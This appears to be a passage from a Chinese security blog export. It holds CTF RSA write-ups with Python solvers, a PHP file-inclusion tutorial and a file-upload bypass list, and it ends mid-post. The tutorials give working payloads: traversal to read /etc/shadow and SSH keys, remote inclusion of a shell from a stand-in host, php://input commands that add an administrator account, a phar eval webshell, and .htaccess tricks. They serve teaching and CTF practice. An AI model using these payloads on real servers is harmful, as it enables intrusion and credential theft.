class="line"><span class="built_in">print</span> <span class="string">'e:%d'</span>%e</span><br></pre></td></tr></table></figure><h2 id="利用-n-算出-p-q-factor-十进制"><a href="#利用-n-算出-p-q-factor-十进制" class="headerlink" title="利用 n 算出 p q  factor(十进制..)"></a>利用 n 算出 p q  factor(十进制..)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yafu-x64.exe factor(87924348264132406875276140514499937145050893665602592992418171647042491658461) </span><br><span class="line"></span><br><span class="line">p = 275127860351348928173285174381581152299</span><br><span class="line">q = 319576316814478949870590164193048041239</span><br></pre></td></tr></table></figure><p>python 代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">代码如下：</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">from libnum import n2s,s2n</span><br><span class="line">import gmpy2</span><br><span class="line">f = open(<span class="string">'flag.enc'</span>,<span class="string">'r'</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">c = s2n(c)</span><br><span class="line">p = 275127860351348928173285174381581152299</span><br><span class="line">q = 319576316814478949870590164193048041239</span><br><span class="line">n = p*q</span><br><span class="line">r = pow(c,(p+1)/4,p)</span><br><span class="line">s = pow(c,(q+1)/4,q)</span><br><span class="line">a = gmpy2.invert(p,q)</span><br><span class="line">b = gmpy2.invert(q,p)</span><br><span class="line">x =(a*p*s+b*q*r)%n</span><br><span class="line">y =(a*p*s-b*q*r)%n</span><br><span class="line"><span class="built_in">print</span> n2s(x%n)</span><br><span class="line"><span class="built_in">print</span> n2s((-x)%n)</span><br><span class="line"><span class="built_in">print</span> n2s(y%n)</span><br><span class="line"><span class="built_in">print</span> n2s((-y)%n)</span><br></pre></td></tr></table></figure></p><p><img src="flag5.png" alt></p><h1 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h1><p>Extremely hard RSA</p><p>已知 <a href="pubkey2.zip">PUBLIC KEY</a> 和 <a href="flag2.enc">flag.enc</a> </p><p>N 非常大，e=3</p><h2 id="求出-n-e-2"><a href="#求出-n-e-2" class="headerlink" title="求出 n e"></a>求出 n e</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA </span><br><span class="line">pub = RSA.importKey(open(<span class="string">'pubkey.pem'</span>).<span class="built_in">read</span>())</span><br><span class="line">n = long(pub.n)</span><br><span class="line">e = long(pub.e)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'n:%d'</span>%n</span><br><span class="line"><span class="built_in">print</span> <span class="string">'e:%d'</span>%e</span><br><span class="line"></span><br><span class="line">nspan><br><span class="line">e:3</span><br></pre></td></tr></table></figure><p>公钥中，e=3，N非常大。所以可以不断地c+N然后开三次方，直接写代码爆破，不过python单线程有点长，跑了将近30分钟。</p><p>python代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">from libnum import s2n,n2s</span><br><span class="line">from gmpy2 import iroot</span><br><span class="line">n = 721059527572145959497866070657244746540818298735241721382435892767279354577831824618770455583435147844630635953460258329387406192598509097375098935299515255208445013180388186216473913754107215551156731413550416051385656895153798495423962750773689964815342291306243827028882267935999927349370340823239030087548468521168519725061290069094595524921012137038227208900579645041589141405674545883465785472925889948455146449614776287566375730215127615312001651111977914327170496695481547965108836595145998046638495232893568434202438172004892803105333017726958632541897741726563336871452837359564555756166187509015523771005760534037559648199915268764998183410394036820824721644946933656264441126738697663216138624571035323231711566263476403936148535644088575960271071967700560360448191493328793704136810376879662623765917690163480410089565377528947433177653458111431603202302962218312038109342064899388130688144810901340648989107010954279327738671710906115976561154622625847780945535284376248111949506936128229494332806622251145622565895781480383025403043645862516504771643210000415216199272423542871886181906457361118669629044165861299560814450960273479900717138570739601887771447529543568822851100841225147694940195217298482866496536787241</span><br><span class="line">e = 3</span><br><span class="line">f = open(<span class="string">'flag.enc'</span>,<span class="string">'rb'</span>)</span><br><span class="line">c= f.read()</span><br><span class="line">c = s2n(c)</span><br><span class="line">f.close()</span><br><span class="line">i = 118719480</span><br><span class="line"><span class="keyword">while</span> 1:</span><br><span class="line">    res = iroot(c+i*n,3)</span><br><span class="line">    <span class="keyword">if</span>(res[1] == True):</span><br><span class="line">        <span class="built_in">print</span> res[0]</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">"i="</span>+str(i)</span><br><span class="line">    i = i+1</span><br><span class="line"><span class="built_in">print</span> n2s(res[0])</span><br><span class="line"></span><br><span class="line"><span class="comment">#i=118719487</span></span><br></pre></td></tr></table></figure></p><h1 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h1><p>共模攻击(hard RSA)</p><p>已知<a href="rsa.txt">rsa.txt</a></p><p>当 n 不变的情况下，知道 n e1 e2 c1 c2 可以在不知道 d1 d2 的情况下，解出 m<br>首先找到两个 e 是互质的,能够找到 s1,s2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e1*s1 + e2*s2 = 1</span><br></pre></td></tr></table></figure><p>根据一系列推算，可以算出明文 m<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m = c1^s1*c2^s2 mod N</span><br></pre></td></tr></table></figure></p><p>判断是否互质<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def gcd(a,b):  </span><br><span class="line">    <span class="keyword">if</span> a%b == 0:  </span><br><span class="line">        <span class="built_in">return</span> b  </span><br><span class="line">    <span class="keyword">else</span> :  </span><br><span class="line">        <span class="built_in">return</span> gcd(b,a%b)  <span class="comment">#判断是否互质</span></span><br></pre></td></tr></table></figure></p><h2 id="找出互质的两个数"><a href="#找出互质的两个数" class="headerlink" title="找出互质的两个数"></a>找出互质的两个数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">data=open(<span class="string">'rsa.txt'</span>,<span class="string">'r'</span>).<span class="built_in">read</span>()</span><br><span class="line">e=re.compile(r<span class="string">'zks(.*?)zks'</span>).findall(data)  <span class="comment">#把文件中的：改成zks</span></span><br><span class="line">def gcd(a,b):  </span><br><span class="line">    <span class="keyword">if</span> a%b == 0:  </span><br><span class="line">        <span class="built_in">return</span> b  </span><br><span class="line">    <span class="keyword">else</span> :  </span><br><span class="line">        <span class="built_in">return</span> gcd(b,a%b)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> e:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> e:</span><br><span class="line">        <span class="keyword">if</span> gcd(int(i.replace(<span class="string">'L'</span>,<span class="string">''</span>),16),int(j.replace(<span class="string">'L'</span>,<span class="string">''</span>),16))==1:</span><br><span class="line">            <span class="built_in">print</span> i,j,int(i.replace(<span class="string">'L'</span>,<span class="string">''</span>),16),int(j.replace(<span class="string">'L'</span>,<span class="string">''</span>),16)</span><br></pre></td></tr></table></figure><h2 id="python代码如下："><a href="#python代码如下：" class="headerlink" title="python代码如下："></a>python代码如下：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">代码如下：</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">from gmpy2 import invert</span><br><span class="line">from libnum import n2s</span><br><span class="line"></span><br><span class="line">def egcd(a, b):</span><br><span class="line">    <span class="keyword">if</span> a == 0:</span><br><span class="line">        <span class="built_in">return</span> (b, 0, 1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="built_in">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    n = 116547141139745534253172934123407786743246513874292261984447028928003798881819567221547298751255790928878194794155722543477883428672342894945552668904410126460402501558930911637857436926624838677630868157884406020858164140754510239986466552869866296144106255873879659676368694043769795604582888907403261286211</span><br><span class="line">    c1 = 78552378607874335972488545767374401332953345586323262531477516680347117293352843468592985447836452620945707838830990843415342047337735534418287912723395148814463617627398248738969202758950481027762126608368555442533803610260859075919831387641824493902538796161102236794716963153162784732179636344267189394853</span><br><span class="line">    c2 = 98790462909782651815146615208104450165337326951856608832305081731255876886710141821823912122797166057063387122774480296375186739026132806230834774921466445172852604926204802577270611302881214045975455878277660638731607530487289267225666045742782663867519468766276566912954519691795540730313772338991769270201</span><br><span class="line">    e1 = 1804229351</span><br><span class="line">    e2 = 17249876309</span><br><span class="line">    s = egcd(e1, e2)</span><br><span class="line">    s1 = s[1]</span><br><span class="line">    s2 = s[2]</span><br><span class="line">  <span class="comment"># 求模反元素</span></span><br><span class="line">    <span class="keyword">if</span> s1&lt;0:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2&lt;0:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">    m = pow(c1,s1,n)*pow(c2,s2,n) % n</span><br><span class="line">    <span class="comment">#m=hex(m).replace('0x','')</span></span><br><span class="line">    <span class="comment">#print m.decode('hex')</span></span><br><span class="line">    <span class="built_in">print</span> n2s(m)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h1><p>已知<a href="veryhardRSA.rar">veryhardRSA.rar</a></p><p>首先分析加密脚本，先判断下是否够 512-11 位，不够的随机补全。<br>然后就是使用相同的 N，不同的 e,加密相同的数据，所以想到了共模攻击。</p><p>python代码如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">代码如下：</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">from libnum import n2s,s2n</span><br><span class="line">from gmpy2 import invert</span><br><span class="line">n = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929L</span><br><span class="line">def egcd(a, b):</span><br><span class="line">  <span class="keyword">if</span> a == 0:</span><br><span class="line">    <span class="built_in">return</span> (b, 0, 1)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="built_in">return</span> (g, x - (b // a) * y, y)</span><br><span class="line">fo1 = open(<span class="string">'flag.enc1'</span>, <span class="string">'rb'</span>)</span><br><span class="line">fo2 = open(<span class="string">'flag.enc2'</span>, <span class="string">'rb'</span>)</span><br><span class="line">datafo1 = fo1.read()</span><br><span class="line">c1 = s2n(datafo1)</span><br><span class="line">fo1.close()</span><br><span class="line">datafo2 = fo2.read()</span><br><span class="line">c2 = s2n(datafo2)</span><br><span class="line">fo2.close()</span><br><span class="line">c2 = invert(c2,n)</span><br><span class="line">e1 = 17</span><br><span class="line">e2 = 65537</span><br><span class="line">s = egcd(e1,e2)</span><br><span class="line">s1 = s[1]</span><br><span class="line">s2 = s[2]</span><br><span class="line">s2 = - s2</span><br><span class="line">m = pow(c1, s1, n) * pow(c2, s2, n) % n</span><br><span class="line"><span class="built_in">print</span> n2s(m)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rsa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/2017/12/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2017/12/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>常见的文件包含漏洞利用</p><a id="more"></a><h1 id="文件包含漏洞介绍"><a href="#文件包含漏洞介绍" class="headerlink" title="文件包含漏洞介绍"></a>文件包含漏洞介绍</h1><p>PHP 文件包含漏洞的产生原因是在通过 PHP 的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p><p>最常见的就属于本地文件包含（Local File Inclusion）漏洞了。<br>我们来看下面一段 index.php 代码:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'func'</span>]) &#123;</span><br><span class="line">   include <span class="variable">$_GET</span>[<span class="string">'func'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   include <span class="string">'default.php'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序的本意可能是当提交 url 为 <a href="http://example.com/index.php?func=add.php时，调用" target="_blank" rel="noopener">http://example.com/index.php?func=add.php时，调用</a> add.php 里面的样式内容和功能。直接访问 <a href="http://example.com/index.php" target="_blank" rel="noopener">http://example.com/index.php</a> 则会包含默认的 default.php<br>那么问题来了，如果我们提交<a href="http://example.com/index.php?func=upload/pic/evil.jpg" target="_blank" rel="noopener">http://example.com/index.php?func=upload/pic/evil.jpg</a> ，且 evil.jpg 是由黑客上传到服务器上的一个图片，在图片的末尾添加了恶意的 php 代码，那么恶意的代码就会被引入当前文件执行。</p><h2 id="普通本地文件包含"><a href="#普通本地文件包含" class="headerlink" title="普通本地文件包含"></a>普通本地文件包含</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(<span class="string">"inc/"</span> . <span class="variable">$_GET</span>[<span class="string">'file'</span>]); ?&gt;</span><br></pre></td></tr></table></figure><p>1）、包含同目录下的文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=.htaccess</span><br></pre></td></tr></table></figure></p><p>2）、目录遍历：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../var/lib/locate.db</span><br><span class="line">?file=../../../../../../../../../var/lib/mlocate/mlocate.db</span><br><span class="line">（linux 中这两个文件储存着所有文件的路径，需要 root 权限）</span><br></pre></td></tr></table></figure></p><p>3）、包含错误日志：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../var/<span class="built_in">log</span>/apache/error.log （试试把UA设置为<span class="string">""</span>来使 payload 进入日志）</span><br></pre></td></tr></table></figure></p><p>4）、获取 web 目录或者其他配置文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../usr/<span class="built_in">local</span>/apache2/conf/httpd.conf</span><br></pre></td></tr></table></figure></p><p>5）、包含上传的附件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../attachment/media/xxx.file</span><br></pre></td></tr></table></figure></p><p>6）、读取 session 文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7</span><br><span class="line">（session 文件一般在 /tmp 目录下，格式为 sess_[your phpsessid value]，有时候也有可能在 /var/lib/php5 之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制 session 的值，也许你能够获得一个 shell）</span><br></pre></td></tr></table></figure></p><p>7）、如果拥有 root 权限还可以试试读这些东西：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_rsa.keystore</span><br><span class="line">/root/.ssh/id_rsa.pub</span><br><span class="line">/root/.ssh/known_hosts</span><br><span class="line">/etc/shadow</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.mysql_history</span><br><span class="line">/proc/self/fd/fd[0-9]* (文件标识符)</span><br><span class="line">/proc/mounts</span><br><span class="line">/proc/config.gz</span><br></pre></td></tr></table></figure></p><h2 id="有限制的本地文件包含"><a href="#有限制的本地文件包含" class="headerlink" title="有限制的本地文件包含"></a>有限制的本地文件包含</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(<span class="string">"inc/"</span> . <span class="variable">$_GET</span>[<span class="string">'file'</span>] . <span class="string">".htm"</span>); ?&gt;</span><br></pre></td></tr></table></figure><p>1）、%00 截断：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../etc/passwd%00</span><br><span class="line">(需要 magic_quotes_gpc=off，PHP 小于 5.3.4 有效)</span><br></pre></td></tr></table></figure></p><p>2）、%00 截断目录遍历：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../var/www/%00</span><br><span class="line">(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</span><br></pre></td></tr></table></figure></p><p>3）、路径长度截断：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</span><br><span class="line">(php 版本小于 5.2.8(?)可以成功，linux 需要文件名长于 4096，windows 需要长于 256)</span><br></pre></td></tr></table></figure></p><p>4）、点号截断：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../../boot.ini/………[…]…………</span><br><span class="line">(php 版本小于 5.2.8(?)可以成功，只适用 windows，点号需要长于 256)</span><br></pre></td></tr></table></figure></p><h2 id="普通远程文件包含"><a href="#普通远程文件包含" class="headerlink" title="普通远程文件包含"></a>普通远程文件包含</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(<span class="variable">$_GET</span>[<span class="string">'file'</span>]); ?&gt;</span><br></pre></td></tr></table></figure><p>1）、远程代码执行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=[http|https|ftp]://example.com/shell.txt</span><br><span class="line">(需要 allow_url_fopen=On 并且 allow_url_include=On)</span><br></pre></td></tr></table></figure></p><p>2）、利用 php 流 input：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=php://input</span><br><span class="line">&lt;?php system(<span class="string">'whoami'</span>);?&gt;</span><br><span class="line">&lt;?php system(<span class="string">'net user zks zks123 /add'</span>);?&gt;</span><br><span class="line">&lt;?php system(<span class="string">'net localgroup administrators zks /add'</span>);?&gt; </span><br><span class="line">(需要 allow_url_include=On，详细→http://php.net/manual/en/wrappers.php.php)</span><br></pre></td></tr></table></figure></p><p>3）、利用 php 流 filter：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p><p><img src="1.jpeg" alt></p><p>4）、利用 data URIs：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</span><br><span class="line">&lt;?php phpinfo();  注意没有&gt;闭合 有就无法执行</span><br><span class="line">(需要allow_url_include=On)</span><br></pre></td></tr></table></figure></p><p>5）、利用 XSS 执行任意代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=http://127.0.0.1/path/xss.php?xss=phpcode</span><br><span class="line">(需要 allow_url_fopen=On，allow_url_include=On 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。条件非常极端和特殊- -)</span><br></pre></td></tr></table></figure></p><p>6）、phar 协议</p><p>phar 是将 php 文件归档到一个文件包里面(我理解是类似与 zip 压缩包一样)创建 phar 的时候要注意 php.ini 的参数,phar.readonly 设置为 off（本地测试的两个默认都是 off）<br>此方法使用要 php&gt;5.3.0<br>首先上传一个包含有一句话木马的压缩包，通过伪协议解析其中的木马文件<br>第一步木马生成压缩包     &lt;?php @eval($_POST[1]);?&gt;<br>第二步将压缩包上传<br>第三步解析压缩包中的文件</p><p><img src="2.jpeg" alt></p><p>利用 zip 或 phar 伪协议读取压缩包中的文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/about.php?f=phar://./images/1499394959.jpg/1.php</span><br><span class="line">/about.php?f=zip://./images/1499394959.jpg%231.php</span><br></pre></td></tr></table></figure></p><p>上传webshell完成</p><h2 id="有限制的远程文件包含"><a href="#有限制的远程文件包含" class="headerlink" title="有限制的远程文件包含"></a>有限制的远程文件包含</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(<span class="variable">$_GET</span>[<span class="string">'file'</span>] . <span class="string">".htm"</span>); ?&gt;</span><br><span class="line">?file=http://example.com/shell</span><br><span class="line">?file=http://example.com/shell.txt?</span><br><span class="line">?file=http://example.com/shell.txt%23</span><br><span class="line">(需要 allow_url_fopen=On 并且 allow_url_include=On)</span><br><span class="line">?file=\evilshare\shell.php (只需要 allow_url_include=On)</span><br></pre></td></tr></table></figure><h1 id="文件包含漏洞防御："><a href="#文件包含漏洞防御：" class="headerlink" title="文件包含漏洞防御："></a>文件包含漏洞防御：</h1><p>设置 open_basedir 将用户可操作的文件限制在某目录下</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传绕过</title>
      <link href="/2017/12/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"/>
      <url>/2017/12/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>常见的文件上传绕过归纳</p><a id="more"></a><h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p>1）、绕过 JavaScript 代码检测</p><p>一般情况下 选择文件还没点击上传 就出错<br>直接用 burpsuite 抓包 上传 jpg 后缀改成 php 后缀即可</p><p>2）、MIME 类型绕过</p><p>上传 php 后缀  改 Content-Type 即可  改成图片类型 image/jpeg  image/gif</p><p>3）、目录路径检测</p><p>%00 截断   通过抓包截断将 evil.php.jpg 后面的一个.换成 0x00<br>或者通过抓包将 evil.php .gif 后面的空格改成 00 即可</p><p>example:</p><p><img src="1.png" alt></p><p><img src="2.png" alt></p><p><img src="3.png" alt></p><p>4）、文件扩展名检测绕过（黑名单）</p><p>文件大小写 Asp phP ASASPP phphpp<br>Asp: asa cer cdx<br>Aspx: ashx<br>PHP: php3、php4、php5、phtml、pht</p><p>5）、文件内容检测</p><p>头文件加 GIF89a 后面加一句话，其他名字可以改成 php。或者直接在一个正常的 gif 后面加一句话<br>6）、上传覆盖 .htaccess 文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">"x.jpg"</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></p><p>然后在相同目录下上传 x.jpg  就可以解析 php 了。</p><p>或者<br>后面就上传了一个 .htaccess 文件里面只有一句。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 